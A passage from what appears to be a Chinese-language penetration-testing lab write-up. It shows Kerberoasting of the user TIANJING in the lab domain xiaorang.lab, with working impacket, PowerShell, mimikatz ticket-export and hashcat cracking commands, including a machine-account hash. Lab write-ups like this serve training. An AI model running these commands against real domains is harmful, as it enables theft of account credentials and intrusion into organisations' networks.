- BloodHound.zip：选择分析高价值目标，发现 TIANJING 这个域用户在备份组里

以先利用 Kerberoasting 拿下 TIANJING 用户 首先请求 WWW/xr-0923.xiaorang.lab/IIS 这个 SPN 的 ST

```bash
# 获取SPN
proxychains GetUserSPNs.py xiaorang.lab/'XR-0923$' -hashes :b2caa4c3f6d5e97bf7c58f7db9e24317 -dc-ip 172.22.14.11
proxychains impacket-GetUserSPNs xiaorang.lab/'XR-0923$' -hashes :b2caa4c3f6d5e97bf7c58f7db9e24317 -dc-ip 172.22.14.11 -request-user tianjing

Import-Module .\Invoke-Kerberoast.ps1
# 用 SharpHound 收集到的 SPNName
$SPNName = 'WWW/xr-0923.xiaorang.lab/IIS'
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName


# 此时用klist就能看到缓存了SPN的ST：
klist
# 用mimikatz导出请求的ST：
.\mimikatz.exe "privilege::debug" "kerberos::list /export" "exit" > 1.txt
# 生成 1-40a1000-xr-0923$@www.-xr-09.kirbi 文件, 方便起见重命名为1.kirbi了,接着把kirbi票据转换一下
python /usr/share/john/kirbi2john.py /tmp/1.kirbi > output.txt
hashcat -m 13100 output.txt /usr/share/wordlists/rockyou.txt --force
```
